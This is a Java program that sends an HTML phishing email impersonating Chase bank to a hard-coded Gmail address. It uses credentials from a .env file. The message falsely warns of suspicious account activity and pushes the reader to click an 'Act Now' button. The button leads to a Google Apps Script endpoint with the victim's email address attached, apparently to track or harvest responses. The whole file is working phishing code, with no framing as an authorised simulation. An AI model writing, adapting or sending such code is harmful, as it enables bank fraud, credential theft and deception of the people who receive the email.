import jakarta.mail.*;
import jakarta.mail.internet.*;
import java.util.Properties;
import io.github.cdimascio.dotenv.Dotenv;

void main() {
    // Load email credentials from .env
    Dotenv dotenv = Dotenv.load();

    // Send email to specified user
    sendEmail(dotenv, "ryanstoffel44@gmail.com");
}

public static void sendEmail(Dotenv dotenv, String recipient) {
    Properties properties = new Properties();
    properties.put("mail.smtp.auth", "true");
    properties.put("mail.smtp.starttls.enable", "true");
    properties.put("mail.smtp.host", dotenv.get("HOST"));
    properties.put("mail.smtp.port", dotenv.get("PORT"));

    Session session = Session.getInstance(properties, new Authenticator() {
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(dotenv.get("EMAIL_USERNAME"), dotenv.get("EMAIL_PASSWORD"));
        }
    });

    try {
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress(dotenv.get("EMAIL_USERNAME")));
        message.setRecipients(Message.RecipientType.TO,
                InternetAddress.parse(recipient));
        message.setSubject("Chase Security Alert: Suspicious Activity Detected");

        // HTML content with button
        String htmlContent = String.format("""
                    <html>
                    <body style="font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
                        <div style="max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                            <h2 style="color: #003087;">Chase Security Alert</h2>
                            <p style="color: #333; font-size: 16px; line-height: 1.6;">
                                We've detected suspicious activity on your account. For your security,
                                please verify your account information immediately.
                            </p>
                            <p style="color: #333; font-size: 16px; line-height: 1.6;">
                                Click the button below to verify account details:
                            </p>
                            <div style="text-align: center; margin: 30px 0;">
                                <a href="https://script.google.com/macros/s/AKfycbwCwotVhud5rhVjIfWqio7G2W_2nXPq0EjluQZgPIRkYK7mokjAr7q-SkWvQ0ui-a-yNg/exec?email=%s"
                                   style="background-color: #0066cc; color: white; padding: 14px 28px;
                                          text-decoration: none; border-radius: 4px; font-weight: bold;
                                          display: inline-block;">
                                    Act Now
                                </a>
                            </div>
                            <p style="color: #666; font-size: 14px; margin-top: 30px;">
                                If you did not request this, please contact Chase immediately.
                            </p>
                        </div>
                    </body>
                    </html>
                    """, recipient);

        message.setContent(htmlContent, "text/html; charset=utf-8");

        Transport.send(message);
        System.out.println("Email sent successfully");

    } catch (MessagingException e) {
        throw new RuntimeException(e);
    }
}